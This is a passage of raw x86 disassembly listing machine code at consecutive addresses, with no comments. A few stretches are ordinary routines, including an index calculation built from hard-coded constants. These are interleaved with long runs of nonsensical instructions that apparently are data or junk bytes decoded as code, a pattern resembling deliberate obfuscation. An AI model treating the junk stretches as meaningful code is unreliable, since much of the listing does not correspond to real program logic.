  411bbf:	inc    ebp
  411bc0:	inc    ebp
  411bc1:	ror    BYTE PTR [edi],1
  411bc3:	jnp    0x411bd7
  411bc5:	xchg   ebp,eax
  411bc6:	jne    0x411bea
  411bc8:	add    al,0x6f
  411bca:	lea    eax,[esp+0x24]
  411bce:	push   eax
  411bcf:	call   0x40f1e1
  411bd4:	mov    eax,DWORD PTR [esp+0x18]
  411bd8:	mov    ecx,DWORD PTR [esp+0x1c]
  411bdc:	push   DWORD PTR [ebp+0x18]
  411bdf:	mov    ebx,DWORD PTR [ebp+0xc]
  411be2:	push   DWORD PTR [ebp+0x14]
  411be5:	mov    esi,DWORD PTR [ebp+0x8]
  411be8:	push   DWORD PTR [ebp+0x10]
  411beb:	push   DWORD PTR [esp+0x20]
  411bef:	push   DWORD PTR [esp+0x20]
  411bf3:	push   DWORD PTR [esp+0x38]
  411bf7:	push   DWORD PTR [esp+0x38]
  411bfb:	call   0x401000
  411c00:	pop    esi
  411c01:	pop    ebx
  411c02:	mov    esp,ebp
  411c04:	pop    ebp
  411c05:	ret    0x14
  411c08:	push   ebp
  411c09:	mov    ebp,esp
  411c0b:	sub    esp,0x30
  411c0e:	mov    DWORD PTR [ebp-0x24],0x7c16
  411c15:	mov    DWORD PTR [ebp-0x20],0x53bd
  411c1c:	mov    DWORD PTR [ebp-0x18],0x3bd5
  411c23:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  411c2a:	mov    DWORD PTR [ebp-0xc],0x4b9d
  411c31:	mov    DWORD PTR [ebp-0x8],0x7e48
  411c38:	mov    DWORD PTR [ebp-0x4],0x604b
  411c3f:	mov    DWORD PTR [ebp-0x30],0x5b69
  411c46:	mov    DWORD PTR [ebp-0x2c],0x4521
  411c4d:	mov    DWORD PTR [ebp-0x28],0x2979
  411c54:	mov    DWORD PTR [ebp-0x14],0x9e8
  411c5b:	mov    DWORD PTR [ebp-0x10],0x40e5
  411c62:	mov    ecx,DWORD PTR [ebp-0x4]
  411c65:	mov    eax,DWORD PTR [ebp-0x8]
  411c68:	add    ecx,0x1d04
  411c6e:	xor    ecx,eax
  411c70:	mov    eax,DWORD PTR [ebp-0xc]
  411c73:	and    ecx,0x6f79
  411c79:	imul   ecx,eax
  411c7c:	xor    ecx,0xe33ab1
  411c82:	push   esi
  411c83:	mov    DWORD PTR [ebp-0x4],0x5989
  411c8a:	mov    DWORD PTR [ebp-0x8],0x402c1
  411c91:	mov    DWORD PTR [ebp-0xc],0x4114
  411c98:	mov    eax,DWORD PTR [ebp-0xc]
  411c9b:	mov    esi,DWORD PTR [ebp-0x8]
  411c9e:	xor    edx,edx
  411ca0:	sub    eax,0x6cb6
  411ca5:	div    esi
  411ca7:	mov    edx,DWORD PTR [ebp-0x4]
  411caa:	mov    esi,DWORD PTR [ebp+0xc]
  411cad:	or     eax,edx
  411caf:	xor    eax,0x67f1
  411cb4:	mov    edx,ecx
  411cb6:	sub    edx,eax
  411cb8:	mov    DWORD PTR [ebp-0x4],edx
  411cbb:	mov    eax,DWORD PTR [ebp-0x4]
  411cbe:	mov    edx,DWORD PTR [ebp-0x4]
  411cc1:	mov    dl,BYTE PTR [edx+esi*1]
  411cc4:	mov    esi,DWORD PTR [ebp+0x8]
  411cc7:	mov    BYTE PTR [eax+esi*1],dl
  411cca:	mov    eax,DWORD PTR [ebp-0x10]
  411ccd:	mov    edx,DWORD PTR [ebp-0x14]
  411cd0:	jmp    0x411fd9
  411cd5:	xchg   esi,eax
  411cd6:	mov    dh,0x33
  411cd8:	push   edx
  411cd9:	xor    ebx,DWORD PTR [eax+edi*4-0x46]
  411cdd:	push   eax
  411cde:	ret    0x923c
  411ce1:	aas    
  411ce2:	fstp   st(5)
  411ce4:	nop
  411ce5:	mov    WORD PTR [eax-0x42],fs
  411ce8:	mov    esi,0xbebec28e
  411ced:	adc    BYTE PTR [edx+0x45],bh
  411cf0:	les    edx,FWORD PTR [edi-0x7f]
  411cf3:	bnd je 0x411d2a
  411cf6:	sub    BYTE PTR [edx+edi*4+0x16],bl
  411cfa:	jmp    0xb40f:0xbde5af69
  411d01:	test   al,0x7f
  411d03:	and    ecx,ebp
  411d05:	fstp   TBYTE PTR [esi-0x36]
  411d08:	jle    0x411c98
  411d0a:	hlt    
  411d0b:	jne    0x411d60
  411d0d:	sbb    edx,ecx
  411d0f:	push   ebp
  411d10:	jmp    0x70ee:0xd6cf4bda
  411d17:	bound  esi,QWORD PTR [edi]
  411d19:	cld    
  411d1a:	add    eax,DWORD PTR [edi+0x60f2069a]
  411d20:	add    al,0x78
  411d22:	cmp    eax,0xfd4de351
  411d27:	test   dl,ch
  411d29:	lea    edi,[eax-0x43a494c1]
  411d2f:	push   ds
  411d30:	inc    ebx
  411d31:	jl     0x411d5a
  411d33:	mov    eax,0x9ecbdb44
  411d38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d39:	sbb    DWORD PTR [edi],edi
  411d3b:	sub    DWORD PTR [ebp-0xadf6dc8],ebp
  411d41:	bound  edx,QWORD PTR [edi+ebx*1+0xb9859c2]
  411d48:	ja     0x411cff
  411d4a:	sbb    BYTE PTR [eax],ch
  411d4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d4d:	xchg   ebp,eax
  411d4e:	mov    ds:0x8a5eed2a,al
  411d53:	test   dh,bl
  411d55:	les    ecx,FWORD PTR [esi+0x21]
  411d58:	fsubr  QWORD PTR [ecx]
  411d5a:	(bad)  
  411d5b:	xchg   ebx,eax
  411d5c:	and    DWORD PTR [ebp+0x76],eax
  411d5f:	ins    BYTE PTR es:[edi],dx
  411d60:	test   eax,0x70a6e36e
  411d65:	out    dx,al
  411d66:	rcl    eax,cl
  411d68:	clc    
  411d69:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  411d6b:	jl     0x411dd3
  411d6d:	ins    DWORD PTR es:[edi],dx
  411d6e:	shr    ebx,0xfa
  411d71:	enter  0x472f,0x98
  411d75:	mov    cl,0xcf
  411d77:	out    dx,eax
  411d78:	jno    0x411de9
  411d7a:	mov    eax,ds:0xa9d9a3d7
  411d7f:	xchg   edx,eax
  411d80:	cmp    eax,0xaa54438f
  411d85:	aad    0x92
  411d87:	fwait
  411d88:	pop    ss
  411d89:	pop    ds
  411d8a:	mov    ds,WORD PTR [edi-0x71]
  411d8d:	pop    ebx
  411d8e:	out    dx,al
  411d8f:	pop    esi
  411d90:	ja     0x411d78
  411d92:	icebp  
  411d93:	adc    esp,esi
  411d95:	jae    0x411e06
  411d97:	stos   DWORD PTR es:[edi],eax
  411d98:	test   al,0xdd
  411d9a:	(bad)
  411d9f:	(bad)  
  411da0:	mov    edi,0x35f34ff9
  411da5:	mov    bl,0x3b
  411da7:	fcomip st,st(7)
  411da9:	or     eax,esi
  411dab:	cmp    ebx,ecx
  411dad:	cld    
  411dae:	ins    DWORD PTR es:[edi],dx
  411daf:	push   esp
  411db0:	lds    ecx,FWORD PTR [eax]
  411db2:	and    edi,DWORD PTR [ecx-0x27]
  411db5:	xchg   edx,eax
  411db6:	mov    bh,0xac
  411db8:	sar    BYTE PTR [eax],0x61
  411dbb:	xchg   ebp,eax
  411dbc:	nop
  411dbd:	jmp    0x411dbb
  411dbf:	jo     0x411d4d
  411dc1:	push   edx
  411dc2:	xor    ebp,DWORD PTR [eax-0x4a]
  411dc5:	ins    DWORD PTR es:[edi],dx
  411dc6:	and    cl,BYTE PTR [ecx+eax*8+0x340ade85]
  411dcd:	loope  0x411d9c
  411dcf:	pop    eax
  411dd0:	cmc    
  411dd1:	das    
  411dd2:	vpsubsb ymm5,ymm0,ymm2
  411dd6:	outs   dx,DWORD PTR ds:[esi]
  411dd7:	test   eax,0x5fdab2af
  411ddc:	push   es
  411ddd:	bound  esp,QWORD PTR [ebx-0x55]
  411de0:	inc    ecx
  411de1:	sub    al,0x31
  411de3:	mov    dl,BYTE PTR [ebp+0xb396969]
  411de9:	sbb    BYTE PTR [ebx+eax*4],dh
  411dec:	in     eax,0x86
  411dee:	dec    edx
  411def:	icebp  
  411df0:	bound  esi,QWORD PTR [edx+edx*2+0x1b03f4f9]
  411df7:	lods   eax,DWORD PTR ds:[esi]
  411df8:	sbb    esp,DWORD PTR [ecx+0x70659e1b]
  411dfe:	mov    ecx,0x77f423cf
  411e03:	inc    esi
  411e04:	inc    ebx
  411e05:	outs   dx,DWORD PTR ds:[esi]
  411e06:	js     0x411e74
  411e08:	sub    dl,dl
  411e0a:	cmp    dh,BYTE PTR [edx]
  411e0c:	or     DWORD PTR [ecx-0x28],edi
  411e0f:	outs   dx,BYTE PTR ds:[esi]
  411e10:	jnp    0x411e41
  411e12:	es lock aas 
  411e15:	inc    edi
  411e16:	ins    BYTE PTR es:[edi],dx
  411e17:	bound  ebx,QWORD PTR [ebx-0x45]
  411e1a:	mov    al,ds:0x384ca9a1
  411e1f:	pop    esi
  411e20:	and    eax,0x64a09dac
  411e25:	adc    al,0x94
  411e27:	or     eax,0x3c1ec07d
  411e2c:	jge    0x411dfd
  411e2e:	or     al,BYTE PTR [edi-0x5e]
  411e31:	cmp    al,BYTE PTR [edi+edi*2]
  411e34:	dec    edx
  411e35:	aas    
  411e36:	imul   esi,ebx,0x40
  411e39:	xchg   ebx,eax
  411e3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e3b:	mov    WORD PTR [esi],fs
  411e3d:	js     0x411e64
  411e3f:	rcl    DWORD PTR [esi+0x1a],1
  411e42:	push   cs
  411e43:	sbb    eax,0x86224543
  411e48:	adc    bl,BYTE PTR cs:[bp+di]
  411e4c:	mov    ebx,0x5d69f45a
  411e51:	mov    ebx,0xa6b7f85c
  411e56:	xchg   edx,eax
  411e57:	leave  
  411e58:	(bad)  
  411e5a:	clc    
  411e5b:	(bad)  
  411e5c:	mov    ecx,0x677aad1
  411e61:	pop    edx
  411e62:	inc    edi
  411e63:	out    dx,al
  411e64:	mov    eax,0x3324d586
  411e69:	mov    ebx,0x330ccd56
  411e6e:	ret    0x99e
  411e71:	aam    0xdc
  411e73:	call   FWORD PTR [ebp-0x5ec97eb4]
  411e79:	sub    ecx,esp
  411e7b:	sub    esi,DWORD PTR ds:0x6a7058a0
  411e81:	sub    BYTE PTR [eax+eax*2+0x1ec69d9f],bl
  411e88:	sbb    esi,eax
  411e8a:	xor    ah,BYTE PTR [ecx+0x0]
  411e8d:	add    ch,BYTE PTR [ebp+0x63]
  411e90:	mov    dh,0x35
  411e92:	dec    ebx
  411e93:	test   DWORD PTR [eax+0x28a7c6f3],esp
  411e99:	test   ebp,esp
  411e9b:	dec    esp
  411e9c:	dec    ecx
  411e9d:	(bad)  
  411e9e:	mov    edx,0x267344af
  411ea3:	mov    cl,0xfd
  411ea5:	ret    0x7bc3
  411ea8:	jae    0x411ee7
  411eaa:	fcomp  st(5)
  411eac:	and    ebp,edx
  411eae:	imul   ebp,ebp,0x99a9fa2c
  411eb4:	ins    DWORD PTR es:[edi],dx
  411eb5:	out    0x10,eax
  411eb7:	add    eax,0x79824ad2
  411ebc:	dec    esp
  411ebd:	mov    edi,0x9842ee0f
  411ec2:	in     eax,0x42
  411ec4:	mov    ds:0xfeb06f1e,eax
  411ec9:	and    DWORD PTR [edi+0x5f13b900],0xffffffe5
  411ed0:	jno    0x411e63
  411ed2:	in     eax,0xae
  411ed4:	out    dx,eax
  411ed5:	xchg   esp,eax
  411ed6:	loopne 0x411f4e
  411ed8:	adc    ecx,DWORD PTR [esi-0x3ad94200]
  411ede:	sub    bl,BYTE PTR [esi-0x13]
  411ee1:	sub    BYTE PTR [eax+0x7],0x90
  411ee5:	gs ret 
  411ee7:	xchg   esp,eax
  411ee8:	sub    DWORD PTR [ebx+edx*8-0x7f],ebp
  411eec:	pop    ss
  411eed:	fisttp WORD PTR [edi]
  411eef:	xchg   ecx,eax
  411ef0:	mov    esp,DWORD PTR ds:0x94602bc8
  411ef6:	stc    
  411ef7:	fidivr DWORD PTR [bx+di]
  411efa:	jg     0x411f06
  411efc:	jnp    0x411ed0
  411efe:	xlat   BYTE PTR ds:[ebx]
  411eff:	arpl   si,bp
  411f01:	les    esp,FWORD PTR [edx+0x34ce60a]
  411f07:	jno    0x411ecf
  411f09:	mov    ch,0x6b
  411f0b:	and    cl,ch
  411f0d:	imul   DWORD PTR [eax+0x2d]
  411f10:	adc    BYTE PTR [esi+0x48e34bbd],cl
  411f16:	push   ebx
  411f17:	inc    ecx
  411f18:	fucomi st,st(1)
  411f1a:	adc    eax,0x2b7b257d
  411f1f:	dec    eax
  411f20:	je     0x411eb5
  411f22:	pushf  
  411f23:	and    bh,BYTE PTR [esi+0x393a04db]
  411f29:	pop    ecx
  411f2a:	ret    
  411f2b:	shr    DWORD PTR [edx-0x34981bb2],0x70
  411f32:	dec    esp
  411f33:	inc    edx
  411f34:	pop    esi
  411f35:	push   cs
  411f36:	ffree  st(4)
  411f38:	inc    edx
  411f39:	inc    edx
  411f3a:	dec    edx
  411f3b:	data16 in al,0x9c
  411f3e:	mov    bl,0x4e
  411f40:	pop    ss
  411f41:	in     eax,dx
  411f42:	(bad)  
  411f44:	aas    
  411f45:	lahf   
  411f46:	daa    
  411f47:	mov    fs,edi
  411f49:	jmp    0x718671e6
  411f4e:	xlat   BYTE PTR ds:[ebx]
  411f4f:	pop    ecx
  411f51:	loope  0x411f1e
  411f53:	jl     0x411fb0
  411f55:	and    ch,ah
  411f57:	push   ecx
  411f58:	mov    dh,0xb4
  411f5a:	xchg   esi,eax
  411f5b:	xlat   BYTE PTR ds:[ebx]
  411f5c:	arpl   ax,dx
  411f5e:	adc    BYTE PTR [eax],ch
  411f60:	add    edi,DWORD PTR [edx+0x39]
  411f63:	jns    0x411f6f
  411f65:	sub    bl,BYTE PTR [eax-0x27]
  411f68:	ds push esi
  411f6a:	push   es
  411f6b:	adc    eax,0x6dae7d71
  411f70:	int    0x55
  411f72:	pop    eax
  411f73:	loope  0x411f29
  411f75:	cmp    esp,DWORD PTR [edx-0x77d627bf]
  411f7b:	cld    
  411f7c:	into   
  411f7d:	sub    BYTE PTR [ebx+0x7bbd39ac],bh
  411f83:	jo     0x411f8e
  411f85:	repnz xchg ebx,eax
  411f87:	call   0x7c640b08
  411f8c:	lock imul ecx,DWORD PTR [edx],0x7a
  411f90:	pushf  
  411f91:	test   BYTE PTR [ebp-0x2f],ah
  411f94:	mov    ds:0xf5ad5886,eax
  411f99:	inc    esi
  411f9a:	cmp    eax,0xd430344d
  411f9f:	lea    esi,[ecx+0x21]
  411fa2:	cmp    ecx,DWORD PTR [eax+ebp*4]
  411fa5:	xor    al,ch
  411fa7:	into   
  411fa8:	xchg   edi,eax
  411fa9:	xchg   esi,esi
  411fab:	aad    0xf9
  411fad:	shl    BYTE PTR ds:0xd37c7c65,1
  411fb3:	add    esp,DWORD PTR [esi-0x1f6dff13]
  411fb9:	out    0xa5,al
  411fbb:	mov    edi,?
  411fbd:	enter  0xed8f,0x43
  411fc1:	push   edi
  411fc2:	jp     0x411fce
  411fc4:	mov    eax,ds:0x22f2016b
  411fc9:	pop    esp
  411fca:	pop    ds
  411fcb:	mov    al,0x27
  411fcd:	fisttp QWORD PTR [ebx]
  411fcf:	jp     0x411f8b
  411fd1:	fs or  dh,cl
  411fd4:	pop    esi
  411fd5:	or     DWORD PTR [eax-0x3f965731],eax
  411fdb:	nop
  411fdc:	sar    BYTE PTR [ebx],cl
  411fde:	add    al,0x23
  411fe0:	ret    0x400d
  411fe3:	sbb    al,BYTE PTR [eax]
  411fe5:	add    BYTE PTR ds:0x1ac1,dh
  411feb:	add    ecx,eax
  411fed:	mov    eax,DWORD PTR [ebp-0x18]
  411ff0:	mov    edx,0x7380
  411ff5:	sub    edx,eax
  411ff7:	add    edx,DWORD PTR [ebp-0x1c]
  411ffa:	mov    eax,DWORD PTR [ebp-0x20]
  411ffd:	xor    edx,eax
  411fff:	mov    eax,DWORD PTR [ebp-0x24]
  412002:	and    edx,eax
  412004:	mov    eax,DWORD PTR [ebp+0x10]
  412007:	jmp    0x412310
  41200c:	icebp  
  41200d:	or     DWORD PTR [ebp+0x7c3cad28],0xcf30669c
  412017:	nop
  412018:	dec    eax
  412019:	pop    ss
  41201a:	xchg   BYTE PTR [esp+ebx*2-0x7141419a],ah
  412021:	ret    0xbebe
  412024:	xor    BYTE PTR ds:0x2b6291e9,cl
  41202a:	mov    esi,edx
  41202c:	mov    esp,ebx
  41202e:	rol    dh,cl
  412030:	hlt    
  412031:	ins    DWORD PTR es:[edi],dx
  412032:	cmp    eax,0x2eca76f4
  412037:	adc    al,0x58
  412039:	repnz fs inc esi
  41203c:	mov    ds:0xfa801871,eax
  412041:	pop    edx
  412042:	sub    DWORD PTR [ecx+ecx*8],ebp
  412045:	push   es
  412046:	push   0xffffffab
  412048:	retf   0x6f76
  41204b:	add    eax,0x7f17778e
  412050:	push   cs
  412051:	jmp    0x8f55:0x23921fe1
  412058:	mov    ebx,0x1f6826e3
  41205d:	mov    eax,0xa1746c7f
  412062:	(bad)  
  412064:	push   cs
  412065:	inc    esp
  412066:	dec    esp
  412067:	sub    DWORD PTR [ebp+0xa],0x59
  41206b:	retf   0x4106
  41206e:	int    0x52
  412070:	cdq    
  412071:	popf   
  412072:	jmp    0xb2cd:0xc3fc3ca9
  412079:	outs   dx,BYTE PTR ds:[esi]
  41207a:	mov    DWORD PTR [ecx+ebp*2+0x3cc6ab2f],esi
  412081:	shl    DWORD PTR [ebx+0x5344aae1],1
  412087:	dec    ebx
  412088:	push   0xffffff82
  41208a:	das    
  41208b:	jnp    0x4120b0
  41208d:	in     eax,0xe0
  41208f:	add    al,0x91
  412091:	jb     0x41203d
  412093:	or     DWORD PTR [esp+ebx*4-0x17],0xffffffc0
  412098:	lds    eax,FWORD PTR [ecx-0x56696072]
  41209e:	mov    al,0xd6
  4120a0:	mov    cl,0x40
  4120a2:	adc    DWORD PTR [edi-0xdf2820a],ebp
  4120a8:	mov    ds:0xe87652c8,al
  4120ad:	sub    al,ch
  4120af:	sets   BYTE PTR [ecx+0xe]
  4120b3:	add    ah,BYTE PTR ds:0x23509746
  4120b9:	xchg   edi,eax
  4120ba:	xchg   esi,eax
  4120bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120bc:	jo     0x412097
  4120be:	jg     0x4120ed
  4120c0:	adc    edx,0xaf9b47ef
  4120c6:	or     cl,BYTE PTR [edi-0x7117554c]
  4120cc:	in     eax,dx
  4120cd:	mov    WORD PTR [ecx],gs
  4120cf:	daa    
  4120d0:	test   eax,0x1de69f2c
  4120d5:	mov    BYTE PTR ds:0xf3fb6a5e,bh
  4120db:	inc    ebx
  4120dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120dd:	xor    BYTE PTR [ebx+0x68],al
  4120e0:	mov    dh,0x98
  4120e2:	out    0xcf,al
  4120e4:	mov    al,ah
  4120e6:	rol    BYTE PTR [esi],0x6
  4120e9:	pop    ebx
  4120ea:	fcom   QWORD PTR [esp+ecx*8+0x2e355480]
  4120f1:	pop    edx
  4120f2:	jae    0x41214f
  4120f4:	ret    0xb15b
  4120f7:	addr16 push 0x87dc83ad
  4120fd:	adc    al,0x93
  4120ff:	xor    cl,BYTE PTR ds:0xcabdf87
  412105:	jl     0x4120f5
  412107:	sbb    al,0xb4
  412109:	cli    
  41210a:	cwde   
  41210b:	adc    eax,0x37
  41210e:	enter  0x1425,0x20
  412112:	sar    DWORD PTR [ebx],0xa
  412115:	leave  
  412116:	inc    ebx
  412117:	idiv   DWORD PTR [edi+esi*2]
  41211a:	push   esi
  41211b:	jne    0x41215c
  41211d:	shl    DWORD PTR [eax],1
  41211f:	retf   
  412120:	stos   DWORD PTR es:[edi],eax
  412121:	cli    
  412122:	mov    dl,0xc8
  412124:	dec    esi
  412125:	sbb    eax,DWORD PTR [ebx]
  412127:	test   BYTE PTR [edx+eiz*2],ah
  41212a:	je     0x41211b
  41212c:	repz xchg edx,eax
  41212e:	loop   0x4120df
  412130:	retf   
  412131:	xor    edi,edi
  412133:	add    ah,BYTE PTR ds:0xb75fda2f
  412139:	daa    
  41213a:	jnp    0x4120f1
  41213c:	jge    0x412135
  41213e:	lods   eax,DWORD PTR ds:[esi]
  41213f:	inc    ecx
  412140:	icebp  
  412141:	push   ebx
  412142:	in     al,dx
  412143:	mov    eax,0x2ac173f3
  412148:	ds adc ax,0x2c
  41214d:	cwde   
  41214e:	ins    BYTE PTR es:[edi],dx
  41214f:	jmp    0x41212e
  412151:	aam    0x87
  412153:	loopne 0x412142
  412155:	inc    edi
  412156:	xlat   BYTE PTR ds:[ebx]
  412157:	add    DWORD PTR [edx-0x71e2fc9e],0xcfc20943
  412161:	mov    eax,ds:0x200ad209
  412166:	mov    al,0xb3
  412168:	loop   0x412136
  41216a:	fisub  WORD PTR [eax]
  41216c:	xor    al,0x87
  41216e:	mov    dh,0xdb
  412170:	jo     0x412175
  412172:	(bad)  
  412173:	gs xchg esp,eax
  412175:	xor    BYTE PTR [ecx+edi*4-0x4d48c2ed],al
  41217c:	cmp    eax,0x37f3b9b4
  412181:	jle    0x412104
  412183:	pop    ss
  412184:	inc    ebp
  412185:	and    al,0xac
  412187:	mov    ecx,0x2ec8669
  41218c:	popf   
  41218d:	xor    eax,0xe61dc267
  412192:	sub    BYTE PTR [ebp+0x1d],0xfb
  412196:	and    al,0xc2
  412198:	mov    ?,WORD PTR [eax+0x969da6]
  41219e:	in     al,0xfc
  4121a0:	mov    ah,bl
  4121a2:	jmp    0x8811:0x16236034
  4121a9:	add    DWORD PTR [ebp+0x39e1d3e1],edx
  4121af:	dec    esi
  4121b0:	pop    eax
  4121b1:	mov    ah,0xdf
  4121b3:	repz enter 0x2ed4,0x2a
  4121b8:	mov    ds:0x4281cc0a,al
  4121bd:	and    esi,ebx
  4121bf:	jmp    0x70bf:0xd79b05d9
  4121c6:	ret    
  4121c7:	(bad)  
  4121c9:	(bad)  
  4121ca:	cdq    
  4121cb:	pop    ecx
  4121cc:	sbb    eax,0xa637291f
  4121d1:	push   cs
  4121d2:	cmp    esp,DWORD PTR ds:0xf6cc8cf
  4121d8:	js     0x41220f
  4121da:	dec    edi
  4121db:	call   0x7f901dc2
  4121e0:	jmp    0x41223a
  4121e2:	adc    DWORD PTR ds:0xb7ca7566,ebx
  4121e8:	fld    QWORD PTR [esp+edx*4+0x44b8eef1]
  4121ef:	call   0x30bf8501
  4121f4:	gs in  eax,0xfd
  4121f7:	mov    edx,ebp
  4121f9:	mov    al,0x9d
  4121fb:	jmp    0xc316:0xe2a9708f
  412202:	and    al,0x49
  412204:	inc    edx
  412205:	adc    eax,0xc1947067
  41220a:	(bad)
  41220d:	sub    eax,0xc0b5dbab
  412212:	mov    ah,0x94
  412214:	sub    DWORD PTR [esi+0x24],eax
  412217:	add    al,0x22
  412219:	icebp  
  41221a:	je     0x412228
  41221c:	aaa    
  41221d:	pop    ds
  41221e:	mov    ds:0x2ddb8309,eax
  412223:	ins    BYTE PTR es:[edi],dx
  412224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412225:	or     BYTE PTR [ecx+ecx*1],cl
  412228:	aad    0xa7
  41222a:	int3   
  41222b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41222c:	outs   dx,DWORD PTR ds:[esi]
  41222d:	dec    edi
  41222e:	out    0x27,al
  412230:	test   al,0x1e
  412232:	inc    esp
  412233:	popf   
  412234:	stos   DWORD PTR es:[edi],eax
  412235:	fstp   DWORD PTR [ebp-0x4cdd70b3]
  41223b:	mov    eax,0x86c9acbb
  412240:	xlat   BYTE PTR ds:[ebx]
  412241:	mov    ?,WORD PTR [ebp+0x201f77f9]
  412247:	or     DWORD PTR [edi-0x7f118663],esi
  41224d:	sahf   
  41224e:	sub    DWORD PTR ds:0x6b544228,edi
  412254:	cmp    BYTE PTR ds:0x78062b76,dl
  41225a:	outs   dx,BYTE PTR ds:[esi]
  41225b:	cmp    cl,BYTE PTR [ecx-0x27]
  41225e:	mov    ecx,0xf158ee1d
  412263:	mov    eax,0xea42543
  412268:	ins    DWORD PTR es:[edi],dx
  412269:	mov    edi,0x270d76b6
  41226e:	dec    ebx
  41226f:	ds jb  0x41220f
  412272:	adc    cl,al
  412274:	ret    0x3462
  412277:	push   ebx
  412278:	cmc    
  412279:	stc    
  41227a:	xchg   ah,dh
  41227c:	loop   0x4122eb
  41227e:	mov    ds:0x8d2761d5,al
  412283:	fild   WORD PTR [esi-0x23]
  412286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412287:	sbb    al,0x97
  412289:	inc    eax
  41228a:	push   edx
  41228b:	lock adc BYTE PTR [edx-0x9],0xd7
  412290:	je     0x41223f
  412292:	sub    bh,BYTE PTR [esi+0x43]
  412295:	sub    BYTE PTR [edi],bl
  412297:	out    dx,eax
  412298:	adc    eax,0x2b7f252d
  41229d:	sub    ah,BYTE PTR [edi]
  41229f:	dec    edi
  4122a0:	adc    bh,ah
  4122a2:	fwait
  4122a3:	jp     0x4122fa
  4122a5:	sub    al,0x8c
  4122a7:	jl     0x412299
  4122a9:	rcr    BYTE PTR [ebp-0x749da7a2],0x2c
  4122b0:	cmp    cl,BYTE PTR [ecx]
  4122b2:	test   eax,0xd9459a5b
  4122b7:	leave  
  4122b8:	xchg   edx,eax
  4122b9:	(bad)  
  4122ba:	jmp    0x41231b
  4122bc:	lea    esp,[ecx-0x5096b366]
  4122c2:	mov    al,ds:0x2cf8ca4d
  4122c7:	or     eax,0xf5e38c4
  4122cc:	sbb    eax,0xd093e03c
  4122d1:	xor    BYTE PTR ds:0xb1f68b06,ah
  4122d7:	push   0xffffff80
  4122d9:	fisubr WORD PTR [eax+edx*8-0x49ce1673]
  4122e0:	add    BYTE PTR [ebp+0x12623508],ah
  4122e6:	dec    ecx
  4122e7:	push   esp
  4122e8:	retf   0xf54d
  4122eb:	je     0x41235f
  4122ed:	and    DWORD PTR [edx+0x28390378],ebx
  4122f3:	sub    ch,BYTE PTR [ebp+0x18d18fd7]
  4122f9:	icebp  
  4122fa:	inc    ebx
  4122fb:	xor    DWORD PTR [edi+0x27],esp
  4122fe:	cwde   
  4122ff:	sub    dl,BYTE PTR [edi+0x1723aa9d]
  412305:	retf   0x787e
  412308:	and    al,0xc9
  41230a:	dec    esp
  41230b:	lahf   
  41230c:	call   0x81ec49ed
  412311:	repnz adc eax,0x2b000070
  412317:	ret    0x558b
  41231a:	fmul   DWORD PTR [ebx-0x1d7e2b8b]
  412320:	jnp    0x41234c
  412322:	add    BYTE PTR [eax],al
  412324:	lea    edx,[edx+esi*1-0x3571]
  41232b:	mov    esi,DWORD PTR [ebp-0x30]
  41232e:	shr    edx,1
  412330:	or     edx,esi
  412332:	mov    esi,ecx
  412334:	sub    esi,edx
  412336:	add    esi,0x4751
  41233c:	cmp    esi,eax
  41233e:	jbe    0x411c83
  412344:	pop    esi
  412345:	leave  
  412346:	ret    0xc
  412349:	push   ebp
  41234a:	mov    ebp,esp
  41234c:	sub    esp,0x80
  412352:	push   ebx
  412353:	jmp    0x41268c
  412358:	push   0xffffffd2
  41235a:	jnp    0x4122dc
  41235c:	jl     0x412306
  41235e:	mov    edx,0xa0fab73b
  412363:	nop
  412364:	push   edx
  412365:	jb     0x4122ef
  412367:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412368:	sub    al,0x6c
  41236a:	mov    esi,0xbec4edbe
  41236f:	mov    esi,0x91dfa6c7
  412374:	jo     0x4123dc
  412376:	pop    ecx
  412377:	loop   0x41236c
  412379:	mov    al,ds:0xe6221881
  41237e:	sbb    al,0xb0
  412380:	mov    edi,0xe214c4ae
  412385:	cmp    esi,0xb516af7a
  41238b:	int3   
  41238c:	push   ecx
  41238d:	xchg   ebp,eax
  41238e:	jmp    0x59ac:0xc255026a
  412395:	sahf   
  412396:	lock or DWORD PTR [eax+0x3cce625b],ebp
  41239d:	lds    esp,FWORD PTR [ecx-0x7e9e58aa]
  4123a3:	aaa    
  4123a4:	or     al,0xf3
  4123a6:	out    0x86,al
  4123a8:	push   ecx
  4123a9:	addr16 (bad) 
  4123ab:	(bad)  
  4123ac:	ss test esp,0x33fd5ec
  4123b3:	in     al,dx
  4123b4:	shr    bl,0xbf
  4123b7:	mov    cl,0xb3
  4123b9:	(bad)  
  4123bb:	les    edx,FWORD PTR [ecx+0x41]
  4123be:	lahf   
  4123bf:	clc    
  4123c0:	imul   edi,DWORD PTR [esi],0x1586caec
  4123c6:	aas    
  4123c7:	out    0xf,al
  4123c9:	leave  
  4123ca:	mov    cl,0x40
  4123cc:	outs   dx,BYTE PTR ds:[esi]
  4123cd:	icebp  
  4123ce:	data16 sbb bl,BYTE PTR [ebx+0x25f3c7ee]
  4123d5:	cmc    
  4123d6:	pop    eax
  4123d7:	pop    eax
  4123d8:	rcl    edi,0xbc
  4123db:	xor    al,0xa8
  4123dd:	jp     0x4123d4
  4123df:	jle    0x412412
  4123e1:	xor    eax,0xc012c969
  4123e6:	jae    0x41242a
  4123e8:	es fwait
  4123ea:	dec    edx
  4123eb:	mov    bh,0xfd
  4123ed:	ret    0x9760
  4123f0:	mul    BYTE PTR [edx]
  4123f2:	je     0x41241d
  4123f4:	mov    bh,0xfb
  4123f6:	jg     0x41239d
  4123f8:	xor    BYTE PTR [ebx-0x15],dl
  4123fb:	sub    BYTE PTR [edx+0x7a],dh
  4123fe:	aaa    
  4123ff:	cmp    DWORD PTR [edi-0x5c],0xffffffd5
  412403:	jmp    FWORD PTR [edx+esi*2]
  412406:	scas   al,BYTE PTR es:[edi]
  412407:	mov    fs,WORD PTR [eax+0xd7aeffd]
  41240d:	icebp  
  41240e:	or     BYTE PTR ds:0xa1765d4b,0x4b
